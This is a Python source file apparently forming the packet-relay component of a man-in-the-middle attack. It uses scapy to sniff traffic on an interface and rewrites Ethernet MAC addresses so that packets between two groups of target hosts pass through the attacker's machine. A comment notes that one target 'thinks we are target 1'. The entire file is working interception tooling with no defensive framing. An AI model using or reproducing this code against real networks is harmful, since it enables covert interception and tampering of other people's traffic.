import sys
import time
from scapy.all import *

class TrafficRedirect():
    interface = 0

    def __init__(self, intFace):
        self.interface = intFace

    def doRedirect(self, target1, target2, target1MAC, target2MAC, oneway):

        def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, interface):
            # if source is target 1 then someone from target 2 must be the true reciever
            if pkt[Ether].src in target1MAC:
                print("Traffic from machine 1")
                found = False
                # find true receiver (the mac of true receiver)
                receiver = pkt[IP].dst
                for i in range(len(target2)):
                    if receiver == target2[i]:
                        # we are the source now cause target 2 thinks we are target 1
                        pkt[Ether].src = pkt[Ether].dst
                        # set the mac of the true receiver (someone from list target2)
                        pkt[Ether].dst = target2MAC[i]
                        found = True
                        break
                # send the packet
                if found:
                    send(pkt, iface=interface)
            # same but with source target 2
            elif pkt[Ether].src in target2MAC:
                print("Traffic from machine 2")
                found = False
                receiver = pkt[IP].dst
                for i in range(len(target1)):
                    if receiver == target1[i]:
                        pkt[Ether].src = pkt[Ether].dst
                        pkt[Ether].dst = target1MAC[i]
                        found = True
                        break
                if found:
                    send(pkt, iface=interface)

        def makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, interface):
            # if source is target 1 then someone from target 2 must be the true receiver
            if pkt[Ether].src in target1MAC:
                print("Traffic from machine 1")
                found = False
                # find true receiver (the mac of true receiver)
                receiver = pkt[IP].dst
                for i in range(len(target2)):
                    if receiver == target2[i]:
                        # set the mac of the true receiver (someone from list target2)
                        pkt[Ether].dst = target2MAC[i]
                        found = True
                        break
                # send the packet
                if found:
                    send(pkt, iface=interface)

        if oneway:
            while True:
                sniff(count=1, store=0, prn=lambda pkt: makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
        else:
            while True:
                sniff(count=1, store=0, prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, self.interface), iface=self.interface)